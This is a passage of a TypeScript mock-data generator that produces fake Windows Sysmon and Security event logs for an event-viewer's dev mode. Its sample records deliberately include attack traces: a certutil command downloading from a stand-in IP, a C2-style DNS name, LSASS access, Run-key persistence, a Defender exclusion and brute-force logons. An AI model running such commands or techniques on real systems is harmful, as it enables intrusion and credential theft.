// Sample data for `node modules/build.mjs --dev event-viewer`: ~80 logs and believable
// event XML (with RenderingInfo) generated on demand, deterministic per record ID.
// Honours reverse, max, paging, a subset of XPath (levels, event IDs, providers,
// time ranges, audit keywords) and `text`; subscribe/poll get new events every few
// seconds. Security needs ?admin, like the real thing.
import type { EventChannel, EventLogInfo, EventPage, EventQuery } from "../../shared/api";
import { installMock } from "../../shared/mock";

// ── randomness ───────────────────────────────────────────────────────────

type Rng = () => number;
function rng(seed: number): Rng {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
function hash(s: string): number {
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}
const pick = <T>(r: Rng, xs: readonly T[]): T => xs[Math.floor(r() * xs.length)];
const int = (r: Rng, lo: number, hi: number) => lo + Math.floor(r() * (hi - lo + 1));
const hexs = (r: Rng, n: number) => {
  let s = "";
  for (let i = 0; i < n; i++) s += "0123456789abcdef"[Math.floor(r() * 16)];
  return s;
};
const guid = (r: Rng) => `{${hexs(r, 8)}-${hexs(r, 4)}-${hexs(r, 4)}-${hexs(r, 4)}-${hexs(r, 12)}}`;
const hx = (n: number) => "0x" + n.toString(16);

// ── the machine ──────────────────────────────────────────────────────────

const HOST = "DESKTOP-7Q2K4NM";
const USER = "alex";
const USER_SID = "S-1-5-21-3623811015-3361044348-30300820-1001";
const ME = `${HOST}\\${USER}`;
const SYSTEM = "NT AUTHORITY\\SYSTEM";
const LSASS = 812;

interface Spec {
  provider: string;
  guid?: string;
  classic?: boolean;
  qualifiers?: number;
  eventId: number;
  version?: number;
  level: number;
  task?: number;
  taskName?: string;
  opcode?: number;
  opcodeName?: string;
  keywords?: string;
  keywordNames?: readonly string[];
  pid?: number;
  tid?: number;
  sid?: string;
  data?: [string, string][];
  userData?: string;
  /** null: the provider's messages aren't available (raw XML, no RenderingInfo) */
  message: string | null;
  activity?: string;
}

type Maker = (r: Rng, t: number) => Spec;

const LEVEL_NAMES = ["Information", "Critical", "Error", "Warning", "Information", "Verbose"];
const esc = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const escA = (s: string) => esc(s).replace(/'/g, "&apos;");

function iso7(t: number, r: Rng): string {
  return new Date(t).toISOString().replace("Z", "") + String(int(r, 0, 9999)).padStart(4, "0") + "Z";
}
function utc(t: number): string {
  return new Date(t).toISOString().replace("T", " ").replace("Z", "");
}

function toXml(channel: string, rid: number, t: number, s: Spec, r: Rng): string {
  const sys =
    `<System><Provider Name='${escA(s.provider)}'${s.guid ? ` Guid='${s.guid}'` : ""}${s.classic ? ` EventSourceName='${escA(s.provider)}'` : ""}/>` +
    `<EventID${s.qualifiers !== undefined ? ` Qualifiers='${s.qualifiers}'` : ""}>${s.eventId}</EventID><Version>${s.version ?? 0}</Version>` +
    `<Level>${s.level}</Level><Task>${s.task ?? 0}</Task><Opcode>${s.opcode ?? 0}</Opcode><Keywords>${s.keywords ?? "0x80000000000000"}</Keywords>` +
    `<TimeCreated SystemTime='${iso7(t, r)}'/><EventRecordID>${rid}</EventRecordID><Correlation${s.activity ? ` ActivityID='${s.activity}'` : ""}/>` +
    `<Execution ProcessID='${s.pid ?? 4}' ThreadID='${s.tid ?? int(r, 100, 20000)}'/><Channel>${esc(channel)}</Channel><Computer>${HOST}</Computer>` +
    `<Security${s.sid ? ` UserID='${s.sid}'` : ""}/></System>`;
  const data =
    s.userData !== undefined
      ? `<UserData>${s.userData}</UserData>`
      : s.data
        ? `<EventData>${s.data.map(([k, v]) => (k ? `<Data Name='${escA(k)}'>${esc(v)}</Data>` : `<Data>${esc(v)}</Data>`)).join("")}</EventData>`
        : "";
  const ri =
    s.message === null
      ? ""
      : `<RenderingInfo Culture='en-US'><Message>${esc(s.message)}</Message><Level>${LEVEL_NAMES[s.level]}</Level><Task>${esc(s.taskName ?? "")}</Task>` +
        `<Opcode>${esc(s.opcodeName ?? "Info")}</Opcode><Channel>${esc(channel)}</Channel><Provider>${esc(s.provider)}</Provider>` +
        `<Keywords>${(s.keywordNames ?? []).map((k) => `<Keyword>${esc(k)}</Keyword>`).join("")}</Keywords></RenderingInfo>`;
  return `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>${sys}${data}${ri}</Event>`;
}

// ── Sysmon ───────────────────────────────────────────────────────────────

interface Proc {
  image: string;
  cmd: string;
  user: string;
  desc: string;
  company: string;
  ver: string;
  integrity: string;
  pid: number;
}
const P = (image: string, cmd: string, user: string, desc: string, company: string, ver: string, integrity: string, pid: number): Proc => ({ image, cmd, user, desc, company, ver, integrity, pid });
const MS = "Microsoft Corporation";
const W = "10.0.26100.1 (WinBuild.160101.0800)";
const PROCS: Proc[] = [
  P("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", SYSTEM, "Host Process for Windows Services", MS, W, "System", 1844),
  P("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s Dnscache", "NT AUTHORITY\\NETWORK SERVICE", "Host Process for Windows Services", MS, W, "System", 2216),
  P("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none', ME, "Google Chrome", "Google LLC", "130.0.6723.70", "Medium", 9876),
  P("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --lang=en-US --renderer-client-id=42 --time-ticks-at-unix-epoch=-1729851000123456', ME, "Google Chrome", "Google LLC", "130.0.6723.70", "Untrusted", 11220),
  P("C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", ME, "Windows Explorer", MS, W, "Medium", 6512),
  P("C:\\Program Files\\Shellmosaic\\shellmosaic.exe", '"C:\\Program Files\\Shellmosaic\\shellmosaic.exe"', ME, "Shellmosaic", "Shellmosaic", "0.3.0", "Medium", 14388),
  P("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoLogo -NoProfile", ME, "Windows PowerShell", MS, W, "Medium", 0),
  P("C:\\Program Files\\PowerShell\\7\\pwsh.exe", '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoLogo', ME, "pwsh", MS, "7.4.6.500", "Medium", 0),
  P("C:\\Windows\\System32\\cmd.exe", 'C:\\Windows\\system32\\cmd.exe /c "whoami /all"', ME, "Windows Command Processor", MS, W, "Medium", 0),
  P("C:\\Program Files\\Git\\cmd\\git.exe", "git status --porcelain=v2 --branch", ME, "Git for Windows", "The Git Development Community", "2.47.0.windows.1", "Medium", 0),
  P("C:\\Program Files\\nodejs\\node.exe", '"C:\\Program Files\\nodejs\\node.exe" C:\\src\\shellmosaic\\node_modules\\vite\\bin\\vite.js --port 5180', ME, "Node.js JavaScript Runtime", "Node.js", "24.11.0", "Medium", 15020),
  P("C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", '"C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe" --type=utility --utility-sub-type=node.mojom.NodeService', ME, "Visual Studio Code", MS, "1.95.1", "Medium", 13108),
  P("C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", ME, "Console Window Host", MS, W, "Medium", 0),
  P("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding", "NT AUTHORITY\\NETWORK SERVICE", "WMI Provider Host", MS, W, "System", 4920),
  P("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"', SYSTEM, "Antimalware Service Executable", MS, "4.18.24090.11", "System", 4388),
  P("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\alex\\AppData\\Local\\Temp\\upd4721.dll,DllRegisterServer", ME, "Windows host process (Rundll32)", MS, W, "Medium", 0),
  P("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.23:8080/a.txt C:\\Users\\Public\\a.txt", ME, "CertUtil.exe", MS, W, "Medium", 0),
  P("C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe", '"C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe" -steam -novid', ME, "Counter-Strike 2", "Valve", "1.40.3.8", "Medium", 17744),
  P("C:\\Users\\alex\\Tools\\loader.exe", '"C:\\Users\\alex\\Tools\\loader.exe" --attach cs2.exe', ME, "", "", "", "High", 18240),
  P("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly", ME, "Host Process for Windows Tasks", MS, W, "Medium", 0),
  P("C:\\Windows\\System32\\SearchProtocolHost.exe", '"C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe12_ Global\\UsGthrCtrlFltPipeMssGthrPipe12 1 -2147483646', SYSTEM, "Microsoft Windows Search Protocol Host", MS, W, "System", 0),
  P("C:\\Program Files\\Sysinternals\\procexp64.exe", '"C:\\Program Files\\Sysinternals\\procexp64.exe"', ME, "Sysinternals Process Explorer", "Sysinternals - www.sysinternals.com", "17.06", "High", 8044),
];
const WEIGHTS = [8, 4, 9, 6, 4, 6, 3, 2, 3, 3, 2, 3, 3, 2, 2, 0.6, 0.4, 2, 0.7, 2, 2, 1];
const LSASS_IMG = "C:\\Windows\\system32\\lsass.exe";

function weighted<T>(r: Rng, xs: readonly T[], ws: readonly number[]): T {
  const total = ws.reduce((a, b) => a + b, 0);
  let x = r() * total;
  for (let i = 0; i < xs.length; i++) {
    x -= ws[i];
    if (x <= 0) return xs[i];
  }
  return xs[xs.length - 1];
}

const imageHash = (image: string) => {
  const r = rng(hash(image));
  return `SHA1=${hexs(r, 40).toUpperCase()},MD5=${hexs(r, 32).toUpperCase()},SHA256=${hexs(r, 64).toUpperCase()},IMPHASH=${hexs(r, 32).toUpperCase()}`;
};
const procGuid = (p: Proc, pid: number) => {
  const r = rng(hash(p.image + pid));
  return `{4a3f6b2e-${hexs(r, 4)}-671b-${hexs(r, 4)}-0000000${hexs(r, 2)}f00}`;
};
const pidOf = (r: Rng, p: Proc) => p.pid || int(r, 1000, 30000) & ~3;

const SYSMON_TASKS: Record<number, [string, string]> = {
  1: ["Process Create", "ProcessCreate"],
  3: ["Network connection detected", "NetworkConnect"],
  5: ["Process terminated", "ProcessTerminate"],
  7: ["Image loaded", "ImageLoad"],
  8: ["CreateRemoteThread detected", "CreateRemoteThread"],
  10: ["Process accessed", "ProcessAccess"],
  11: ["File created", "FileCreate"],
  12: ["Registry object added or deleted", "RegistryEvent"],
  13: ["Registry value set", "RegistryEvent"],
  17: ["Pipe Created", "PipeEvent"],
  22: ["Dns query", "DnsQuery"],
  23: ["File Delete archived", "FileDelete"],
};

function sysmon(id: number, t: number, r: Rng, fields: [string, string][]): Spec {
  const [title, rule] = SYSMON_TASKS[id];
  const data: [string, string][] = [["RuleName", "-"], ["UtcTime", utc(t)], ...fields];
  if (id === 13 || id === 12 || id === 17) data.splice(1, 0, ["EventType", id === 13 ? "SetValue" : id === 12 ? pick(r, ["CreateKey", "DeleteKey"]) : "CreatePipe"]);
  const rn = fields.find(([k]) => k === "RuleName");
  if (rn) data.shift();
  return {
    provider: "Microsoft-Windows-Sysmon",
    guid: "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
    eventId: id,
    version: id === 1 || id === 3 ? 5 : 3,
    level: 4,
    task: id,
    taskName: `${title} (rule: ${rule})`,
    keywords: "0x8000000000000000",
    pid: 3412,
    sid: "S-1-5-18",
    data,
    message: `${title}:\n` + data.map(([k, v]) => `${k}: ${v}`).join("\n"),
  };
}

const NET: [string, string, number, string][] = [
  ["142.250.74.110", "fra16s52-in-f14.1e100.net", 443, "https"],
  ["140.82.121.4", "lb-140-82-121-4-fra.github.com", 443, "https"],
  ["20.42.65.92", "-", 443, "https"],
  ["104.18.32.47", "-", 443, "https"],
  ["13.107.42.14", "-", 443, "https"],
  ["185.199.108.133", "cdn-185-199-108-133.github.com", 443, "https"],
  ["162.254.193.6", "-", 27017, "-"],
  ["192.168.1.1", "router.lan", 53, "domain"],
  ["198.51.100.23", "-", 8080, "http-alt"],
];
const DNS: [string, string, string][] = [
  ["github.com", "0", "::ffff:140.82.121.4;"],
  ["update.googleapis.com", "0", "type:  5 update.l.google.com;::ffff:142.250.185.67;"],
  ["login.microsoftonline.com", "0", "type:  5 login.mso.msidentity.com;::ffff:20.190.159.2;::ffff:40.126.31.67;"],
  ["settings-win.data.microsoft.com", "0", "type:  5 atm-settingsfe-prod-geo2.trafficmanager.net;::ffff:51.104.15.252;"],
  ["raw.githubusercontent.com", "0", "::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;"],
  ["wpad", "9003", "-"],
  ["steamcommunity.com", "0", "::ffff:104.103.84.217;"],
  ["c2-relay.duckdns.org", "0", "::ffff:198.51.100.23;"],
];
const DLLS: [string, string, string, string][] = [
  ["C:\\Windows\\System32\\amsi.dll", "Anti-Malware Scan Interface", "true", "Microsoft Windows"],
  ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll", "Microsoft .NET Runtime Common Language Runtime - WorkStation", "true", "Microsoft Corporation"],
  ["C:\\Windows\\System32\\dbghelp.dll", "Windows Image Helper", "true", "Microsoft Windows"],
  ["C:\\Windows\\System32\\vaultcli.dll", "Credential Vault Client Library", "true", "Microsoft Windows"],
  ["C:\\Windows\\System32\\wininet.dll", "Internet Extensions for Win32", "true", "Microsoft Windows"],
  ["C:\\Users\\alex\\AppData\\Local\\Temp\\hook64.dll", "", "false", "-"],
  ["C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\engine2.dll", "Valve engine", "true", "Valve Corp."],
];
const FILES = [
  "C:\\Users\\alex\\AppData\\Local\\Temp\\tmp4F21.tmp",
  "C:\\Users\\alex\\Downloads\\SteamSetup.exe",
  "C:\\Windows\\Prefetch\\CMD.EXE-0BD30981.pf",
  "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk",
  "C:\\Users\\alex\\AppData\\Local\\Temp\\__PSScriptPolicyTest_kq2m4n1x.ps1",
  "C:\\src\\shellmosaic\\modules\\event-viewer\\dist\\app.js",
  "C:\\Users\\Public\\a.txt",
];
const REG: [string, string][] = [
  ["HKU\\" + USER_SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe"],
  ["HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\" + USER_SID + "\\\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", "Binary Data"],
  ["HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools", "DWORD (0x00000000)"],
  ["HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime", "QWORD (0x01db26e0-0x8f2c1a00)"],
  ["HKU\\" + USER_SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA", "Binary Data"],
];

const sysmonMaker: Maker = (r, t) => {
  const id = weighted(r, [1, 3, 5, 7, 10, 11, 12, 13, 17, 22, 8, 23], [12, 16, 10, 12, 5, 12, 3, 14, 3, 12, 0.3, 1.5]);
  const p = weighted(r, PROCS, WEIGHTS);
  const pid = pidOf(r, p);
  const base: [string, string][] = [
    ["ProcessGuid", procGuid(p, pid)],
    ["ProcessId", String(pid)],
    ["Image", p.image],
  ];
  switch (id) {
    case 1: {
      const parent = weighted(r, PROCS, WEIGHTS);
      const ppid = pidOf(r, parent);
      return sysmon(1, t, r, [
        ...base,
        ["FileVersion", p.ver || "-"],
        ["Description", p.desc || "-"],
        ["Product", p.company === MS ? "Microsoft® Windows® Operating System" : p.desc || "-"],
        ["Company", p.company || "-"],
        ["OriginalFileName", p.image.split("\\").pop()!.toUpperCase()],
        ["CommandLine", p.cmd],
        ["CurrentDirectory", p.user === ME ? "C:\\Users\\alex\\" : "C:\\Windows\\system32\\"],
        ["User", p.user],
        ["LogonGuid", "{4a3f6b2e-6720-671b-a1c0-0b0000000000}"],
        ["LogonId", p.user === ME ? "0xBC0A1" : "0x3E7"],
        ["TerminalSessionId", p.user === ME ? "1" : "0"],
        ["IntegrityLevel", p.integrity],
        ["Hashes", imageHash(p.image)],
        ["ParentProcessGuid", procGuid(parent, ppid)],
        ["ParentProcessId", String(ppid)],
        ["ParentImage", parent.image],
        ["ParentCommandLine", parent.cmd],
        ["ParentUser", parent.user],
      ]);
    }
    case 3: {
      const [ip, host, port, name] = p.image.includes("rundll32") || p.image.includes("certutil") ? NET[8] : pick(r, NET.slice(0, 8));
      const udp = port === 53;
      return sysmon(3, t, r, [
        ...base,
        ["User", p.user],
        ["Protocol", udp ? "udp" : "tcp"],
        ["Initiated", "true"],
        ["SourceIsIpv6", "false"],
        ["SourceIp", "192.168.1.42"],
        ["SourceHostname", `${HOST}.lan`],
        ["SourcePort", String(int(r, 49152, 65535))],
        ["SourcePortName", "-"],
        ["DestinationIsIpv6", "false"],
        ["DestinationIp", ip],
        ["DestinationHostname", host],
        ["DestinationPort", String(port)],
        ["DestinationPortName", name],
      ]);
    }
    case 5:
      return sysmon(5, t, r, [...base, ["User", p.user]]);
    case 7: {
      const [dll, desc, signed, sig] = pick(r, DLLS);
      return sysmon(7, t, r, [
        ...base,
        ["ImageLoaded", dll],
        ["FileVersion", signed === "true" ? W : "-"],
        ["Description", desc || "-"],
        ["Product", signed === "true" ? "Microsoft® Windows® Operating System" : "-"],
        ["Company", signed === "true" ? MS : "-"],
        ["OriginalFileName", dll.split("\\").pop()!],
        ["Hashes", imageHash(dll)],
        ["Signed", signed],
        ["Signature", sig],
        ["SignatureStatus", signed === "true" ? "Valid" : "Unavailable"],
        ["User", p.user],
      ]);
    }
    case 8:
    case 10: {
      const src = id === 8 ? PROCS[15] : pick(r, [PROCS[21], PROCS[18], PROCS[14], PROCS[15], PROCS[4]]);
      const spid = pidOf(r, src);
      const lsass = src !== PROCS[18];
      const target = lsass ? { image: LSASS_IMG, pid: LSASS, user: SYSTEM } : { image: PROCS[17].image, pid: PROCS[17].pid, user: ME };
      if (id === 8) {
        const tgt = PROCS[4];
        return sysmon(8, t, r, [
          ["SourceProcessGuid", procGuid(src, spid)],
          ["SourceProcessId", String(spid)],
          ["SourceImage", src.image],
          ["TargetProcessGuid", procGuid(tgt, tgt.pid)],
          ["TargetProcessId", String(tgt.pid)],
          ["TargetImage", tgt.image],
          ["NewThreadId", String(int(r, 1000, 30000))],
          ["StartAddress", "0x00000234A1B20000"],
          ["StartModule", "-"],
          ["StartFunction", "-"],
          ["SourceUser", src.user],
          ["TargetUser", tgt.user],
        ]);
      }
      return sysmon(10, t, r, [
        ["SourceProcessGUID", procGuid(src, spid)],
        ["SourceProcessId", String(spid)],
        ["SourceThreadId", String(int(r, 1000, 30000))],
        ["SourceImage", src.image],
        ["TargetProcessGUID", "{4a3f6b2e-6720-671b-0c00-000000003f00}"],
        ["TargetProcessId", String(target.pid)],
        ["TargetImage", target.image],
        ["GrantedAccess", lsass ? pick(r, ["0x1010", "0x1410", "0x1000", "0x1FFFFF"]) : "0x1F3FFF"],
        ["CallTrace", "C:\\Windows\\SYSTEM32\\ntdll.dll+9f4d4|C:\\Windows\\System32\\KERNELBASE.dll+2b54e|" + src.image + "+1a3f2|C:\\Windows\\System32\\KERNEL32.DLL+17374"],
        ["SourceUser", src.user],
        ["TargetUser", target.user],
      ]);
    }
    case 11:
      return sysmon(11, t, r, [...base, ["TargetFilename", pick(r, FILES)], ["CreationUtcTime", utc(t - int(r, 0, 5000))], ["User", p.user]]);
    case 12:
      return sysmon(12, t, r, [...base, ["TargetObject", pick(r, REG)[0].replace(/\\[^\\]+$/, "")], ["User", p.user]]);
    case 13: {
      const [key, val] = pick(r, REG);
      return sysmon(13, t, r, [...base, ["TargetObject", key], ["Details", val], ["User", p.user]]);
    }
    case 17:
      return sysmon(17, t, r, [
        ["ProcessGuid", procGuid(p, pid)],
        ["ProcessId", String(pid)],
        ["PipeName", pick(r, [`\\mojo.${pid}.${int(r, 1000, 9999)}.${int(r, 1e8, 9e8)}`, `\\PSHost.13374${int(r, 1e8, 9e8)}.${pid}.DefaultAppDomain.powershell`, "\\msagent_4f", `\\crashpad_${pid}_KQWZXHFNRNWLBDPI`])],
        ["Image", p.image],
        ["User", p.user],
      ]);
    case 22: {
      const [qn, status, res] = p.image.includes("rundll32") ? DNS[7] : pick(r, DNS.slice(0, 7));
      return sysmon(22, t, r, [["ProcessGuid", procGuid(p, pid)], ["ProcessId", String(pid)], ["QueryName", qn], ["QueryStatus", status], ["QueryResults", res], ["Image", p.image], ["User", p.user]]);
    }
    default:
      return sysmon(23, t, r, [["ProcessGuid", procGuid(p, pid)], ["ProcessId", String(pid)], ["User", p.user], ["Image", p.image], ["TargetFilename", pick(r, FILES)], ["Hashes", imageHash(String(t))], ["IsExecutable", "false"], ["Archived", "true"]]);
  }
};

// ── Security ─────────────────────────────────────────────────────────────

const SEC = { provider: "Microsoft-Windows-Security-Auditing", guid: "{54849625-5478-4994-a5ba-3e3b0328c30d}", pid: LSASS, level: 0 } as const;
const OK = { keywords: "0x8020000000000000", keywordNames: ["Audit Success"] };
const FAIL = { keywords: "0x8010000000000000", keywordNames: ["Audit Failure"] };
const LOGON_TYPES = [2, 3, 5, 7, 10, 11];
const ATTACKERS: [string, string][] = [
  ["203.0.113.77", "kali"],
  ["198.51.100.14", "-"],
  ["192.168.1.66", "WIN-QA3ND9T1KB"],
];
const BAD_USERS = ["administrator", "admin", "alex", "backup", "test", "guest", "sqlsvc"];

function subject(sid = "S-1-5-18", name = `${HOST}$`, domain = "WORKGROUP", logon = "0x3E7"): [string, string][] {
  return [
    ["SubjectUserSid", sid],
    ["SubjectUserName", name],
    ["SubjectDomainName", domain],
    ["SubjectLogonId", logon],
  ];
}

const securityMaker: Maker = (r, t) => {
  const id = weighted(r, [5156, 4624, 4672, 4688, 4689, 4634, 4798, 5379, 4625, 4648, 4776, 4697, 4698, 4720, 4732, 4740, 1102], [25, 18, 12, 12, 10, 8, 4, 4, 5, 2, 2, 0.3, 0.4, 0.15, 0.2, 0.2, 0.05]);
  const logon = hx(int(r, 0x10000, 0xfffff)).toUpperCase().replace("0X", "0x");
  switch (id) {
    case 4624: {
      const lt = weighted(r, LOGON_TYPES, [6, 3, 10, 2, 1, 1]);
      const sys = lt === 5;
      const remote = lt === 3 || lt === 10;
      const [ip] = remote && r() < 0.3 ? pick(r, ATTACKERS) : ["127.0.0.1"];
      const target = sys ? ["S-1-5-18", "SYSTEM", "NT AUTHORITY", "0x3E7"] : [USER_SID, USER, HOST, logon];
      return {
        ...SEC,
        ...OK,
        eventId: 4624,
        version: 3,
        task: 12544,
        taskName: "Logon",
        data: [
          ...subject(),
          ["TargetUserSid", target[0]],
          ["TargetUserName", target[1]],
          ["TargetDomainName", target[2]],
          ["TargetLogonId", target[3]],
          ["LogonType", String(lt)],
          ["LogonProcessName", sys ? "Advapi  " : remote ? "NtLmSsp " : "User32 "],
          ["AuthenticationPackageName", sys ? "Negotiate" : remote ? "NTLM" : "Negotiate"],
          ["WorkstationName", remote ? HOST : "-"],
          ["LogonGuid", "{00000000-0000-0000-0000-000000000000}"],
          ["ProcessId", sys ? "0x2f0" : "0x" + int(r, 0x200, 0x3000).toString(16)],
          ["ProcessName", sys ? "C:\\Windows\\System32\\services.exe" : remote ? "-" : "C:\\Windows\\System32\\svchost.exe"],
          ["IpAddress", remote ? ip : sys ? "-" : "127.0.0.1"],
          ["IpPort", remote ? String(int(r, 1024, 65535)) : sys ? "-" : "0"],
          ["ImpersonationLevel", "%%1833"],
          ["ElevatedToken", sys ? "%%1842" : "%%1843"],
        ],
        message:
          "An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\t" +
          `${HOST}$\n\tAccount Domain:\t\tWORKGROUP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t${lt}\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\t${sys ? "Yes" : "No"}\n\n` +
          `Impersonation Level:\t\tImpersonation\n\nNew Logon:\n\tSecurity ID:\t\t${target[0]}\n\tAccount Name:\t\t${target[1]}\n\tAccount Domain:\t\t${target[2]}\n\tLogon ID:\t\t${target[3]}\n\n` +
          `Network Information:\n\tWorkstation Name:\t${remote ? HOST : "-"}\n\tSource Network Address:\t${remote ? ip : "-"}\n\tSource Port:\t\t${remote ? int(r, 1024, 65535) : "-"}\n\n` +
          "This event is generated when a logon session is created. It is generated on the computer that was accessed.",
      };
    }
    case 4625: {
      const [ip, ws] = pick(r, ATTACKERS);
      const user = pick(r, BAD_USERS);
      const lt = pick(r, [3, 10]);
      return {
        ...SEC,
        ...FAIL,
        eventId: 4625,
        task: 12544,
        taskName: "Logon",
        data: [
          ...subject("S-1-0-0", "-", "-", "0x0"),
          ["TargetUserSid", "S-1-0-0"],
          ["TargetUserName", user],
          ["TargetDomainName", ws === "-" ? "" : ws],
          ["Status", "0xc000006d"],
          ["FailureReason", "%%2313"],
          ["SubStatus", user === "alex" ? "0xc000006a" : "0xc0000064"],
          ["LogonType", String(lt)],
          ["LogonProcessName", "NtLmSsp "],
          ["AuthenticationPackageName", "NTLM"],
          ["WorkstationName", ws],
          ["ProcessId", "0x0"],
          ["ProcessName", "-"],
          ["IpAddress", ip],
          ["IpPort", String(int(r, 1024, 65535))],
        ],
        message:
          `An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t${lt}\n\n` +
          `Account For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t${user}\n\tAccount Domain:\t\t${ws === "-" ? "" : ws}\n\n` +
          `Failure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t${user === "alex" ? "0xC000006A" : "0xC0000064"}\n\n` +
          `Network Information:\n\tWorkstation Name:\t${ws}\n\tSource Network Address:\t${ip}\n\tSource Port:\t\t0\n\n` +
          "This event is generated when a logon request fails. It is generated on the computer where access was attempted.",
      };
    }
    case 4672:
      return {
        ...SEC,
        ...OK,
        eventId: 4672,
        task: 12548,
        taskName: "Special Logon",
        data: [...subject("S-1-5-18", "SYSTEM", "NT AUTHORITY"), ["PrivilegeList", "SeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeDelegateSessionUserImpersonatePrivilege"]],
        message:
          "Special privileges assigned to new logon.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSYSTEM\n\tAccount Domain:\t\tNT AUTHORITY\n\tLogon ID:\t\t0x3E7\n\nPrivileges:\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege",
      };
    case 4688:
    case 4689: {
      const p = weighted(r, PROCS, WEIGHTS);
      const parent = weighted(r, PROCS, WEIGHTS);
      const pid = pidOf(r, p);
      const mine = p.user === ME;
      if (id === 4689)
        return {
          ...SEC,
          ...OK,
          eventId: 4689,
          task: 13313,
          taskName: "Process Termination",
          data: [...subject(mine ? USER_SID : "S-1-5-18", mine ? USER : `${HOST}$`, mine ? HOST : "WORKGROUP", mine ? "0xBC0A1" : "0x3E7"), ["Status", "0x0"], ["ProcessId", hx(pid)], ["ProcessName", p.image]],
          message: `A process has exited.\n\nSubject:\n\tSecurity ID:\t\t${mine ? USER_SID : "S-1-5-18"}\n\tAccount Name:\t\t${mine ? USER : HOST + "$"}\n\nProcess Information:\n\tProcess ID:\t0x${pid.toString(16)}\n\tProcess Name:\t${p.image}\n\tExit Status:\t0x0`,
        };
      return {
        ...SEC,
        ...OK,
        eventId: 4688,
        version: 2,
        task: 13312,
        taskName: "Process Creation",
        data: [
          ...subject(mine ? USER_SID : "S-1-5-18", mine ? USER : `${HOST}$`, mine ? HOST : "WORKGROUP", mine ? "0xBC0A1" : "0x3E7"),
